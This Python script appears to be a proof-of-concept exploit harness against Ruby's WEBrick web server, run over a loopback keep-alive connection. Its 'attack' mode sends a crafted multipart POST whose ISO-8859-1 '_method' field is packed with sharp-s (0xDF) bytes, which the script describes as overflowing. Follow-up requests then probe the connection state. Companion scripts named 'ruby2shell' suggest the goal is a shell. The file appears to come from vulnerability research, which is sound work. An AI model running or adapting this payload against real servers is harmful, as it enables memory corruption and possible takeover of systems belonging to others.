#!/usr/bin/env python3
"""Three sequential requests on ONE WEBrick keep-alive connection.

Used by ruby2shell-webrick-keepalive.sh and ruby2shell-webrick-keep-watch.sh.
Loopback only. mode=control sends a pure-sharp-s (non-overflowing) body.
argv: mode fill port n (n defaults to the historical 572).
"""
import os
import socket
import sys

mode = sys.argv[1] if len(sys.argv) > 1 else 'attack'
fill = int(sys.argv[2]) if len(sys.argv) > 2 else 48
port = int(sys.argv[3]) if len(sys.argv) > 3 else 4551
n = int(sys.argv[4]) if len(sys.argv) > 4 else 572
data = b'\xdf' * n if mode == 'control' else b'a' + b'\xdf' * (n - 1)
method = (b'--XB\r\nContent-Disposition: form-data; name="_method"\r\n'
          b'Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n' + data)
body = (b'--XB\r\nContent-Disposition: form-data; name="f"\r\n'
        b'Content-Type: text/plain\r\n\r\n' + (b'f' * fill) + b'\r\n' + method +
        b'\r\n--XB--\r\n')


def request(sock, line, body=b'', extra=b''):
    head = line + b'\r\nHost: 127.0.0.1\r\nConnection: keep-alive\r\n' + extra
    if body:
        head += b'Content-Length: ' + str(len(body)).encode() + b'\r\n'
    sock.sendall(head + b'\r\n' + body)
    buf = b''
    while b'\r\n\r\n' not in buf:
        part = sock.recv(65536)
        if not part:
            return None, buf
        buf += part
    hdr, rest = buf.split(b'\r\n\r\n', 1)
    length = 0
    for h in hdr.split(b'\r\n'):
        if h.lower().startswith(b'content-length:'):
            length = int(h.split(b':', 1)[1].strip())
    while len(rest) < length:
        part = sock.recv(65536)
        if not part:
            break
        rest += part
    return int(hdr.split(b' ')[1]), rest[:length]


s = socket.create_connection(('127.0.0.1', port), timeout=20)
s.settimeout(20)
status, resp = request(s, b'POST /not-a-route HTTP/1.1', body,
                       b'Content-Type: multipart/form-data; boundary=XB\r\n')
print('request1 _method N=%d status=%s bytes=%s' % (n, status, len(resp or b'')))
plain = (b'--XB\r\nContent-Disposition: form-data; name="f"\r\n'
         b'Content-Type: text/plain\r\n\r\n' + (b'z' * 48) + b'\r\n--XB--\r\n')
status, resp = request(s, b'POST /not-a-route HTTP/1.1', plain,
                       b'Content-Type: multipart/form-data; boundary=XB\r\n')
print('request2 48-byte-part status=%s bytes=%s' % (status, len(resp or b'')))
status, resp = request(s, b'GET /?q=' + b'q' * 512 + b' HTTP/1.1')
print('request3 512-byte-query status=%s bytes=%s' % (status, len(resp or b'')))
s.close()
